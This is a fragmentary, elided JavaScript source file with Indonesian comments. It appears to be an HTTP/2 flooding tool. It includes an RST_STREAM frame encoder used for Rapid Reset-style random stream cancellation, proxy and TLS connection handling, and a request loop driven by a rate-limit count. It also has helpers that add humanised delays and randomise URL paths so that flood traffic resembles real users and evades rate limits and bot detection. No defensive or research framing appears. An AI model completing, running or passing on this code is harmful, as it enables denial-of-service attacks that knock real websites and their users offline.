...
function humanizedDelay() {
  ...
  return Math.max(50, baseDelay + variation); // Minimum 50ms
}
...
function randomizePath(originalPath) {
  ...
  const randomParams = [];
  const paramCount = Math.floor(Math.random() * 3) + 1; // 1-3 parameters
...
// Modern RST_STREAM encoder
function encodeRstStream(streamId, errorCode = 0xC) {
    const frame = Buffer.alloc(13); // 9 + 4 bytes
    frame.writeUInt8(0, 0);                       // Length byte
    frame.writeUInt16BE(4, 1);                    // Payload length = 4
    frame.writeUInt8(0x3, 3);                     // Type = 3 (RST_STREAM)
    frame.writeUInt8(0x0, 4);                     // Flags
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);// Stream ID
    frame.writeUInt32BE(errorCode >>> 0, 9);      // Error code
    return frame;
}
...
// 7. Modified buildRequest function dengan header yang lebih dinamis
...
function go() {
    // PERBAIKAN: Inisialisasi proxy yang benar
        ...
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                ...
                tlsSocket.on('data', (eventData) => {
                    ...
                    // Random occasional reset (simulate user cancel)
                    if (Math.random() < 0.15) {
                        const sid = streamId;
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        const headers = Object.entries({
                            ...
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : randomizePath(url.pathname) + (postdata ? `?${postdata}` : ""),
